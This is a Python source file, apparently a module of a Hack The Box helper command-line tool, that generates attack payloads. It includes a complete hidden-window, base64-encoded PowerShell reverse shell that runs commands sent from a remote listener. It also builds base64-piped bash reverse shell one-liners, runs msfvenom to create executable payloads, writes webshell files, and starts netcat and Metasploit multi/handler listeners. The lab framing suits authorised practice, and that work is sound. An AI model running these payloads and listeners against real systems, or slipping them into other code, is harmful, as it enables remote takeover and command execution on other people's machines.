"""
HTB Tool — Payload Generation & Listener Module

Commands:
  htb payload reverse      Generate reverse shell one-liners
  htb payload msfvenom     Generate msfvenom payloads
  htb payload webshell     Generate webshells
  htb payload listener     Start a netcat listener
  htb payload msflistener  Start Metasploit multi/handler
  htb payload list         List all available payload types
"""
import base64
import os
import subprocess
from datetime import datetime

import click
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.syntax import Syntax

from core.config import (
    REVERSE_SHELL_TEMPLATES, WEBSHELL_TEMPLATES, MSFVENOM_PRESETS,
    DEFAULT_LPORT, get_tun0_ip,
)
from core.project import (
    require_active_project, save_project, get_project_output_dir,
)
from core.logger import ActivityLogger

console = Console()


# ── Helpers ──────────────────────────────────────────────────────────────────

def _detect_lhost() -> str:
    """Auto-detect LHOST from tun0 or ask user."""
    ip = get_tun0_ip()
    if ip:
        return ip
    console.print("[bold yellow]⚠[/] Could not auto-detect tun0 IP. Is VPN connected?")
    return click.prompt("Enter your LHOST IP")


def _generate_ps_b64(lhost: str, lport: int) -> str:
    """Generate base64-encoded PowerShell reverse shell."""
    ps_cmd = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()};"
        "$client.Close()"
    )
    encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
    return f"powershell -nop -w hidden -enc {encoded}"


# ── Click commands ───────────────────────────────────────────────────────────

@click.group("payload")
def payload_group():
    """💣 Generate payloads, reverse shells, and start listeners."""
    pass


@payload_group.command("list")
def payload_list():
    """List all available payload types."""
    # Reverse shells
    table = Table(title="🐚 Reverse Shell Types", header_style="bold cyan")
    table.add_column("Type", style="yellow")
    table.add_column("Description", style="white")
    for name in sorted(REVERSE_SHELL_TEMPLATES.keys()):
        table.add_row(name, f"Reverse shell via {name}")
    console.print(table)

    # Webshells
    table2 = Table(title="🌐 Webshell Types", header_style="bold cyan")
    table2.add_column("Type", style="yellow")
    table2.add_column("Description", style="white")
    for name in sorted(WEBSHELL_TEMPLATES.keys()):
        table2.add_row(name, f"Webshell — {name}")
    console.print(table2)

    # msfvenom presets
    table3 = Table(title="🎯 Msfvenom Presets", header_style="bold cyan")
    table3.add_column("Preset", style="yellow")
    table3.add_column("Payload", style="white")
    table3.add_column("Format", style="dim")
    for name, info in sorted(MSFVENOM_PRESETS.items()):
        table3.add_row(name, info["payload"], info["format"])
    console.print(table3)


@payload_group.command("reverse")
@click.option("--type", "-t", "shell_type", default="bash",
              type=click.Choice(sorted(REVERSE_SHELL_TEMPLATES.keys())),
              help="Shell type")
@click.option("--lhost", default=None, help="Listening host (auto-detects tun0)")
@click.option("--lport", "-p", default=DEFAULT_LPORT, type=int, help="Listening port")
@click.option("--encode", is_flag=True, help="Base64-encode the payload")
def payload_reverse(shell_type, lhost, lport, encode):
    """Generate a reverse shell one-liner."""
    data = require_active_project()
    logger = ActivityLogger(data)

    if not lhost:
        lhost = _detect_lhost()

    console.print(f"[bold]🐚 Generating [cyan]{shell_type}[/] reverse shell[/]")
    console.print(f"[dim]   LHOST={lhost}  LPORT={lport}[/]\n")

    # Generate
    if shell_type == "powershell-base64":
        payload = _generate_ps_b64(lhost, lport)
    else:
        template = REVERSE_SHELL_TEMPLATES[shell_type]
        payload = template.format(lhost=lhost, lport=lport)

    if encode and shell_type != "powershell-base64":
        payload_bytes = payload.encode()
        b64 = base64.b64encode(payload_bytes).decode()
        console.print(Panel(
            f"[bold green]{payload}[/]",
            title="[bold]Raw Payload[/]",
            border_style="green",
        ))
        console.print(Panel(
            f"[bold cyan]echo {b64} | base64 -d | bash[/]",
            title="[bold]Base64 Encoded[/]",
            border_style="cyan",
        ))
    else:
        console.print(Panel(
            f"[bold green]{payload}[/]",
            title=f"[bold]🐚 {shell_type} Reverse Shell[/]",
            border_style="green",
        ))

    # Listener reminder
    console.print(f"\n[dim]💡 Start listener: [bold]nc -lvnp {lport}[/][/]")
    console.print(f"[dim]   Or use: [bold]htb payload listener --port {lport}[/][/]")

    logger.log_payload(
        shell_type,
        details=f"Generated {shell_type} reverse shell → {lhost}:{lport}",
    )
    save_project(data)


@payload_group.command("msfvenom")
@click.option("--preset", "-P", default=None,
              type=click.Choice(sorted(MSFVENOM_PRESETS.keys())),
              help="Use a preset configuration")
@click.option("--payload", "-p", default=None, help="Custom msfvenom payload string")
@click.option("--lhost", default=None, help="Listening host (auto-detects tun0)")
@click.option("--lport", default=DEFAULT_LPORT, type=int)
@click.option("--format", "-f", "fmt", default=None, help="Output format (elf, exe, raw, etc.)")
@click.option("--encoder", "-e", default=None, help="Encoder to use")
@click.option("--iterations", "-i", default=1, type=int, help="Encoding iterations")
@click.option("--outfile", "-o", default=None, help="Output filename")
def payload_msfvenom(preset, payload, lhost, lport, fmt, encoder, iterations, outfile):
    """Generate payloads with msfvenom (presets or custom)."""
    data = require_active_project()
    logger = ActivityLogger(data)

    if not lhost:
        lhost = _detect_lhost()

    # Resolve preset
    if preset:
        preset_data = MSFVENOM_PRESETS[preset]
        if not payload:
            payload = preset_data["payload"]
        if not fmt:
            fmt = preset_data["format"]
        if not outfile:
            outfile = f"shell_{preset}.{preset_data['extension']}"

    if not payload:
        console.print("[bold red]✗[/] Provide --preset or --payload")
        raise SystemExit(1)
    if not fmt:
        fmt = "elf"
    if not outfile:
        outfile = f"payload.{fmt}"

    output_dir = get_project_output_dir(data["name"])
    outpath = output_dir / outfile

    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", fmt,
    ]
    if encoder:
        cmd.extend(["-e", encoder, "-i", str(iterations)])
    cmd.extend(["-o", str(outpath)])

    cmd_str = " ".join(cmd)
    console.print(f"[bold cyan]⚡ Running:[/] [dim]{cmd_str}[/]\n")

    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

    if proc.returncode == 0:
        console.print(f"[bold green]✓[/] Payload generated: [cyan]{outpath}[/]")
        if proc.stdout:
            console.print(f"[dim]{proc.stdout.strip()}[/]")

        # Make executable if ELF
        if fmt == "elf":
            os.chmod(outpath, 0o755)
            console.print("[dim]  → Made executable (chmod +x)[/]")

        console.print(f"\n[dim]💡 Handler: msfconsole -q -x \"use exploit/multi/handler; "
                      f"set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run\"[/]")
    else:
        console.print(f"[bold red]✗[/] msfvenom failed: {proc.stderr}")

    logger.log_payload(
        "msfvenom",
        details=f"Generated {payload} ({fmt}) → {outpath}",
        output_file=str(outpath),
    )
    save_project(data)


@payload_group.command("webshell")
@click.option("--type", "-t", "shell_type", default="php",
              type=click.Choice(sorted(WEBSHELL_TEMPLATES.keys())),
              help="Webshell type")
@click.option("--outfile", "-o", default=None, help="Output filename")
def payload_webshell(shell_type, outfile):
    """Generate a webshell file."""
    data = require_active_project()
    logger = ActivityLogger(data)

    output_dir = get_project_output_dir(data["name"])

    if not outfile:
        ext = shell_type.split("-")[0]  # php-passthru → php
        outfile = f"webshell.{ext}"
    outpath = output_dir / outfile

    content = WEBSHELL_TEMPLATES[shell_type]
    with open(outpath, "w") as f:
        f.write(content)

    console.print(f"[bold green]✓[/] Webshell generated: [cyan]{outpath}[/]")
    console.print(Panel(
        content,
        title=f"[bold]{shell_type} Webshell[/]",
        border_style="yellow",
    ))
    console.print(f"\n[dim]💡 Usage: curl '{'{target}'}/webshell.{shell_type.split('-')[0]}?cmd=id'[/]")

    logger.log_payload("webshell", details=f"Generated {shell_type} webshell", output_file=str(outpath))
    save_project(data)


@payload_group.command("listener")
@click.option("--port", "-p", default=DEFAULT_LPORT, type=int)
@click.option("--rlwrap", is_flag=True, default=True, help="Use rlwrap for readline support")
def payload_listener(port, rlwrap):
    """Start a netcat reverse shell listener."""
    data = require_active_project()
    logger = ActivityLogger(data)

    lhost = _detect_lhost()

    cmd_parts = []
    if rlwrap:
        # Check if rlwrap is available
        if subprocess.run(["which", "rlwrap"], capture_output=True).returncode == 0:
            cmd_parts.append("rlwrap")
        else:
            console.print("[dim]rlwrap not found, using plain nc[/]")
    cmd_parts.extend(["nc", "-lvnp", str(port)])

    cmd_str = " ".join(cmd_parts)
    console.print(f"[bold green]🎧 Starting listener on {lhost}:{port}[/]")
    console.print(f"[dim]   Command: {cmd_str}[/]")
    console.print("[dim]   Press Ctrl+C to stop.[/]\n")

    logger.log_payload("listener", details=f"Started nc listener on port {port}")
    save_project(data)

    # Replace current process with listener
    os.execvp(cmd_parts[0], cmd_parts)


@payload_group.command("msflistener")
@click.option("--payload", "-p", default="windows/x64/meterpreter/reverse_tcp",
              help="Metasploit payload")
@click.option("--lhost", default=None, help="LHOST (auto-detects tun0)")
@click.option("--lport", default=DEFAULT_LPORT, type=int)
def payload_msflistener(payload, lhost, lport):
    """Start a Metasploit multi/handler listener."""
    data = require_active_project()
    logger = ActivityLogger(data)

    if not lhost:
        lhost = _detect_lhost()

    rc_content = (
        f"use exploit/multi/handler\n"
        f"set PAYLOAD {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        f"set ExitOnSession false\n"
        f"exploit -j -z\n"
    )

    output_dir = get_project_output_dir(data["name"])
    rc_file = output_dir / "handler.rc"
    with open(rc_file, "w") as f:
        f.write(rc_content)

    console.print(f"[bold green]🎯 Starting Metasploit handler[/]")
    console.print(f"[dim]   Payload: {payload}[/]")
    console.print(f"[dim]   LHOST={lhost}  LPORT={lport}[/]")
    console.print(f"[dim]   RC file: {rc_file}[/]\n")

    logger.log_payload("msflistener", details=f"Started meterpreter handler {payload} on {lport}")
    save_project(data)

    os.execvp("msfconsole", ["msfconsole", "-q", "-r", str(rc_file)])
